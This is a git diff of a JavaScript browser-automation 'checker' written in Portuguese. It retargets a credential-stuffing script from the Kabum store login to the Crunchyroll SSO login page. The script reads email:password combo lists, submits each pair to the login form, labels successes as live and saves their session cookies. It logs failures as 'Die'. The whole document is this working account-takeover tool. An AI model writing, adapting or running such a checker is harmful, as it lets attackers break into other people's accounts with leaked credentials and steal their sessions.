@@ -26,12 +26,12 @@ const [blue, yellow,green,red,resetColor] = [
 
 
 let page;
-export default async function kabum() {
+export default async function crunchyroll() {
   await clearAndHandleBanner({
-    bannerMessage: "Kabum Checker",
+    bannerMessage: "crunchyroll Checker",
     timeout: 0,
   });
-  const {matchStrings, fileName} = await readFile("kabum");
+  const {matchStrings, fileName} = await readFile("crunchyroll");
   
   // if(!matchStrings) return console.log('sem conta')
   if (!matchStrings) {
@@ -41,7 +41,7 @@ export default async function kabum() {
   }
   
   await clearAndHandleBanner({
-    bannerMessage: "Kabum Checker",
+    bannerMessage: "crunchyroll Checker",
   });
   if (!page) {
     const spinnerInstance = ora({
@@ -52,44 +52,80 @@ export default async function kabum() {
     spinnerInstance.start();
 
     page = await createBrowser({
-      url: "https://www.kabum.com.br/login",
+      url: "https://sso.crunchyroll.com/pt-br/login",
       handle: false,
-      waitFor: '[data-testid="login-input"]'
+      waitFor: '[name="login"]'
     });
 
     spinnerInstance.succeed();
   }
+  const loginInput = await page.$('[name="login"]');
+  await loginInput.evaluate((el) => (el.value = ""));
+  
+  await loginInput.type("dudu@xereca.com");
 
+  await loginInput.press('Enter')
   for (const index in matchStrings) {
     const account = matchStrings[index];
-
+    
     const [http, domain, email, pass] = account.split(":");
-    if (!email || !pass || pass.length > 20) {
+    if (!email || !pass) {
       console.log(red,"Formatação invalida");
       continue;
     }
-
+    console.log(email, ':',pass);
+    
+    
     try {
       if(!dataResults?.[fileName]) dataResults[fileName] ={
         cookiesLives: [],
         lastTested: 0
       }
-      
+
       // if(dataResults[fileName].lastTested >= index) continue
       dataResults[fileName].lastTested = index
       
-      const emailInput = await page.$('[data-testid="login-input"]');
-      await emailInput.evaluate((el) => (el.value = ""));
+     
+
+      await page.waitForSelector('[name="email"]')
+
       
-      await emailInput.type(email);
+      const emailInput = await page.$('[name="email"]');
+if (emailInput) {
+  await emailInput.click();
+  
+  // Limpa o campo com 'Ctrl + A' e 'Delete'
+  await emailInput.press('Control', { delay: 100 });
+  await emailInput.press('a', { delay: 100 });
+  await emailInput.press('Delete');
+
+  // Verifica se está realmente limpo
+  await emailInput.evaluate((el) => console.log('Campo de email após limpeza:', el.value));
+  
+  await emailInput.type(email); // Digita o email
+} else {
+  console.log("Campo de email não encontrado.");
+}
+
+
       
-      const passInput = await page.$('[data-testid="password-input"]');
-      await passInput.evaluate((el) => (el.value = ""));
+      const passInput = await page.$('[name="password"]');
+      //   await passInput.evaluate((el) => (el.value = ""));
+      console.log(emailInput);
+      console.log(emailInput[0]);
+      console.log(passInput);
+      await passInput.type('');
       await passInput.type(pass);
       
     await passInput.press("Enter");
 
     const formatEmailAndPass = `${email}:${pass.replace(/\s+/g, "")}`;
+    const url = await page.url();
+    if(url.includes("/callback?")) {
+        await page.goto("https://sso.crunchyroll.com/pt-br/login", { timeout: 0 });
+        continue
+    }
+    
     await page
       .waitForSelector('[data-testid="generic-error-wrapper"]', {
         timeout: 10000,
@@ -98,7 +134,7 @@ export default async function kabum() {
 
         const url = await page.url();
         
-        if (url == "https://www.kabum.com.br/") {
+        if (url == "https://sso.crunchyroll.com/pt-br/login/") {
 
           const cookie = await page.cookies()
           
@@ -124,13 +160,14 @@ export default async function kabum() {
       }).then(async() => {
         
         const url = await page.url();
+        console.log('url aqui',url);
         
         console.log(
           red,
           `[ Die ] >> [${index}/${matchStrings.length}] >> [ ${formatEmailAndPass} ] -> ${url}`
         );
       })
-
+      
     } catch (error) {
       console.log('Error ', error)
     }
